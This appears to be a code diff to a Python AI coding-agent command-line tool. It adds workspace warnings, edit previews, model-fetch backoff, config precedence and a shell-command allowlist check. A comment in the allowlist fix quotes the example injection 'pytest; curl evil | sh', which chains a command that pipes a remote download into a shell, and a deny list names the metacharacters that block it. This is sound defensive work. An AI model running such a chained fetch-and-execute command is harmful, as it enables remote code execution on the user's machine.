@@ -204,6 +204,25 @@ def default_temperature(model: str) -> float:
     return 0.3
 
 
+def is_home_workspace(path) -> bool:
+    """True when the workspace is the user's home dir (a scatter-prone footgun)."""
+    try:
+        return Path(path).resolve() == Path.home().resolve()
+    except (OSError, RuntimeError):  # RuntimeError: HOME unset
+        return False
+
+
+def broad_workspace_label(path) -> str | None:
+    """A human label if `path` is the home dir or filesystem root, else None."""
+    try:
+        p = Path(path).resolve()
+    except (OSError, RuntimeError):
+        return None
+    if p == Path(p.anchor).resolve():
+        return "the filesystem root"
+    return "your home directory" if is_home_workspace(p) else None
+
+
 def model_context_limit(model: str) -> int:
     """The model's real context window from the catalog (env pin wins)."""
     if _CTX_ENV:
@@ -792,16 +811,23 @@ class Agent:
         steps = 0
         while True:
             if steps >= MAX_STEPS:
-                try:
-                    more = console.input(
-                        f"[yellow]hit {MAX_STEPS} tool steps — keep going? "
-                        f"[y/N] › [/yellow]").strip().lower()
-                except (EOFError, KeyboardInterrupt):
-                    more = "n"
-                if more not in ("y", "yes"):
-                    console.print("[yellow]stopped at step limit.[/yellow]")
-                    return
-                steps = 0
+                # In yolo mode the background stdin reader is live, so a console.input
+                # here would race it for the keystroke — just auto-continue instead.
+                if self.yolo:
+                    console.print(f"[dim]hit {MAX_STEPS} tool steps — continuing "
+                                  f"(yolo)[/dim]")
+                    steps = 0
+                else:
+                    try:
+                        more = console.input(
+                            f"[yellow]hit {MAX_STEPS} tool steps — keep going? "
+                            f"[y/N] › [/yellow]").strip().lower()
+                    except (EOFError, KeyboardInterrupt):
+                        more = "n"
+                    if more not in ("y", "yes"):
+                        console.print("[yellow]stopped at step limit.[/yellow]")
+                        return
+                    steps = 0
             steps += 1
             msg = self._stream()
             self.messages.append(msg)
@@ -823,8 +849,8 @@ class Agent:
         sub = [
             {"role": "system", "content":
              "You are a focused read-only research sub-agent. Investigate using "
-             "read_file/grep/glob_files/list_dir/fetch_url and return a concise, "
-             "concrete answer. You cannot modify files."},
+             "read_file/grep/glob_files/list_dir/web_search/fetch_url and return a "
+             "concise, concrete answer. You cannot modify files."},
             {"role": "user", "content": task},
         ]
         spec = [t for t in tools.TOOLS_SPEC
@@ -920,9 +946,15 @@ class Agent:
         return (f"Switched from {old} to {model} for the rest of the task "
                 f"(temperature now {self.temperature}). Reason: {reason}")
 
+    # Shell metacharacters that let an allowlisted prefix smuggle in a second
+    # command ("pytest; curl evil | sh"). Their presence blocks auto-approval.
+    _CHAIN_CHARS = (";", "&", "|", "`", "$(", ">", "<", "\n")
+
     def _bash_allowed(self, command: str) -> bool:
         cmd = command.strip()
-        return any(cmd == p or cmd.startswith(p + " ") or cmd.startswith(p)
+        if any(c in cmd for c in self._CHAIN_CHARS):
+            return False
+        return any(cmd == p or cmd.startswith(p + " ")
                    for p in self.bash_allow if p)
 
     # ---- confirmation + diff --------------------------------------------- #
@@ -1101,15 +1133,31 @@ def _preview_for(name: str, args: dict):
         if name == "edit_file":
             p = tools._safe_path(args.get("path", ""))
             old = p.read_text() if p.exists() else ""
-            new = old.replace(args.get("old", ""), args.get("new", ""))
+            # Preview via the real edit engine so fuzzy/whitespace matches (and any
+            # failure) show exactly what will be written, not a naive .replace().
+            try:
+                new, _ = tools._apply_edit(old, args.get("old", ""),
+                                           args.get("new", ""),
+                                           bool(args.get("replace_all")))
+            except ValueError as e:
+                return Panel(Text(f"edit will fail: {e}", style="red"),
+                             title=f"edit {args.get('path','')}",
+                             border_style="red", padding=(0, 1), title_align="left")
             body = _diff_text(old, new, args.get("path", ""))
             return Panel(body, title=f"edit {args.get('path','')}",
                          border_style="yellow", padding=(0, 1), title_align="left")
         if name == "multi_edit":
             p = tools._safe_path(args.get("path", ""))
             new = old = p.read_text() if p.exists() else ""
-            for e in args.get("edits", []):
-                new = new.replace(e.get("old", ""), e.get("new", ""))
+            try:
+                for e in args.get("edits", []):
+                    new, _ = tools._apply_edit(new, e.get("old", ""),
+                                               e.get("new", ""),
+                                               bool(e.get("replace_all")))
+            except ValueError as e:
+                return Panel(Text(f"edit {args.get('path','')} will fail: {e}",
+                                  style="red"), title="multi_edit",
+                             border_style="red", padding=(0, 1), title_align="left")
             body = _diff_text(old, new, args.get("path", ""))
             return Panel(body, title=f"multi_edit {args.get('path','')} "
                          f"({len(args.get('edits', []))} edits)",
@@ -1142,16 +1190,25 @@ def cmd_init(agent: Agent) -> None:
 
 
 _MODELS_CACHE: list[dict] | None = None
+_MODELS_FAILED_AT = 0.0
+_MODELS_RETRY_AFTER = 60.0  # after a failed fetch, back off this long before retrying
 
 
 def fetch_models(force: bool = False) -> list[dict]:
-    """All OpenRouter models (cached for the session)."""
-    global _MODELS_CACHE
-    if _MODELS_CACHE is None or force:
-        try:
-            _MODELS_CACHE = requests.get(MODELS_URL, timeout=20).json()["data"]
-        except Exception:  # noqa: BLE001
-            return _MODELS_CACHE or []
+    """All OpenRouter models (cached for the session).
+
+    A failed fetch is remembered so the many callers don't each re-hit a 20 s
+    timeout on a flaky network — startup would otherwise stall for minutes."""
+    global _MODELS_CACHE, _MODELS_FAILED_AT
+    if _MODELS_CACHE is not None and not force:
+        return _MODELS_CACHE
+    if not force and time.time() - _MODELS_FAILED_AT < _MODELS_RETRY_AFTER:
+        return []
+    try:
+        _MODELS_CACHE = requests.get(MODELS_URL, timeout=20).json()["data"]
+    except Exception:  # noqa: BLE001
+        _MODELS_FAILED_AT = time.time()
+        return []
     return _MODELS_CACHE
 
 
@@ -1675,13 +1732,16 @@ def read_message(session: PromptSession) -> str:
 def main() -> None:
     cfg = load_config()
     parser = argparse.ArgumentParser(prog="kode")
+    # CLI flags default to None so an explicit value can be told apart from an
+    # omitted one; precedence is resolved below (CLI > project > global > default).
     parser.add_argument("workspace", nargs="?", default=os.getcwd())
-    parser.add_argument("--model", default=cfg.get("model", DEFAULT_MODEL))
-    parser.add_argument("--yolo", action="store_true", default=cfg.get("yolo", False))
-    parser.add_argument("--budget", type=float, default=cfg.get("budget"),
+    parser.add_argument("--model", default=None)
+    parser.add_argument("--yolo", action=argparse.BooleanOptionalAction, default=None,
+                        help="auto-approve all writes/commands (--no-yolo forces off)")
+    parser.add_argument("--budget", type=float, default=None,
                         help="warn once session cost exceeds this many USD")
-    parser.add_argument("--route", "--auto-route", action="store_true",
-                        dest="route", default=cfg.get("auto_route", False),
+    parser.add_argument("--route", "--auto-route", action=argparse.BooleanOptionalAction,
+                        dest="route", default=None,
                         help="auto-pick a model per prompt (cheap/thinking/default)")
     parser.add_argument("-r", "--resume", "--continue", nargs="?",
                         const="__latest__", default=None, dest="resume",
@@ -1718,15 +1778,24 @@ def main() -> None:
     tools.set_workspace(args.workspace)
     os.chdir(tools.WORKSPACE)
 
-    # Resolution order: per-project config > global config (incl. onboarding) > CLI.
+    # Resolution order: explicit CLI flag > per-project config > global config
+    # (incl. onboarding) > built-in default.
     pcfg = load_project_config(tools.WORKSPACE)
-    model = pcfg.get("model", cfg.get("model", args.model))
-    yolo = args.yolo or cfg.get("yolo", False) or pcfg.get("yolo", False)
-    budget = args.budget if args.budget is not None else pcfg.get("budget")
+
+    def resolve(cli, key, default):
+        if cli is not None:
+            return cli
+        if key in pcfg:
+            return pcfg[key]
+        return cfg.get(key, default)
+
+    model = resolve(args.model, "model", DEFAULT_MODEL)
+    yolo = resolve(args.yolo, "yolo", False)
+    budget = resolve(args.budget, "budget", None)
+    auto_route = resolve(args.route, "auto_route", False)
 
     agent = Agent(api_key, model, yolo=yolo, budget=budget,
-                  auto_route=(args.route or cfg.get("auto_route", False)
-                              or pcfg.get("auto_route", False)),
+                  auto_route=auto_route,
                   system=build_system_prompt(tools.WORKSPACE))
     agent.bash_allow = list(pcfg.get("bash_allow", []))
     slug = re.sub(r"[^a-zA-Z0-9]+", "-", str(tools.WORKSPACE)).strip("-")[-60:]
@@ -1809,6 +1878,14 @@ def main() -> None:
     console.print(Panel("\n".join(rows), border_style="cyan",
                         padding=(0, 2), title="", expand=False))
 
+    broad = broad_workspace_label(tools.WORKSPACE)
+    if broad:
+        console.print(
+            f"[yellow]⚠ workspace is {broad} — new files land directly in "
+            f"{tools.WORKSPACE} and the agent can read/write anything under it. "
+            "For real work, quit and run [bold]kode[/bold] inside a project folder "
+            "(e.g. [bold]mkdir ~/timer && cd ~/timer && kode[/bold]).[/yellow]")
+
     if not agent.api_key:
         console.print("[yellow]⚠ no API key — run [bold]/key[/bold] (or [bold]/setup[/bold]) "
                       "to add your OpenRouter key[/yellow]")
@@ -1844,6 +1921,9 @@ def main() -> None:
             elif cmd == "clear":
                 agent.messages = [agent.messages[0]]
                 tools.TODOS.clear()
+                agent.turn_ckpts.clear()  # else /rewind would restore the old chat
+                agent.title = None
+                agent.last_input = None
                 console.print("[dim]cleared[/dim]")
             elif cmd in ("model", "models"):
                 cmd_model(agent, session, rest)
